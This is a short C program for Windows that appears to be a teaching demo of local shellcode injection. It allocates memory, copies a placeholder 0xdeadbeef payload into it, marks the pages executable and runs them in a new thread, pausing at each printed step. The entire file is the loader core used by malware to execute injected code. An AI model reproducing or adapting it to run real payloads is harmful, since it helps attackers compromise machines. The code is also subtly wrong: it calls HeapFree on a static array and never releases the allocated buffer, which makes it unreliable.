#include <Windows.h>
#include <stdio.h>

unsigned char data[] = {
	0xde,0xad,0xbe,0xef
};

SIZE_T dataLen = sizeof(data);

int main() {

	DWORD dwOldProtect = NULL;

	printf("[+] Injecting shellcode into local process: %d\n", GetCurrentProcessId());
	printf("[!] Press <ENTER> to continue... \n");
	getchar();

	PVOID bufAddress = VirtualAlloc(NULL, dataLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (bufAddress == NULL) {
		printf("[!!] VirtualAlloc failed with error: %d\n", GetLastError());
		return -1;
	}

	printf("[+] Allocated empty memory buffer at: 0x%p\n", bufAddress);
	printf("[!] Press <Enter> to continue... \n");
	getchar();

	memcpy(bufAddress, data, dataLen);

	printf("[+] Payload written to memory buffer at: 0x%p\n", bufAddress);
	printf("[!] Press <Enter> to continue... \n");
	getchar();

	if (!VirtualProtect(bufAddress, dataLen, PAGE_EXECUTE_READWRITE, &dwOldProtect)) {
		printf("[!!] VirtualProtect failed with error: %d \n", GetLastError());
		return -1;
	}

	printf("[+] Page permissions changed to executable.\n");
	printf("[!] Press <Enter> to continue... \n");
	getchar();

	HANDLE hThread = CreateThread(NULL, NULL, bufAddress, NULL, NULL, NULL);
	if ( hThread == NULL) {
		printf("[!!] CreateThread failed with error: %d", GetLastError());
		return -1;
	}
	WaitForSingleObject(hThread, INFINITE);
	HeapFree(GetProcessHeap(), 0, data);
	printf("[!] Press <Enter> to exit... \n");
	getchar();
	return 0;
}
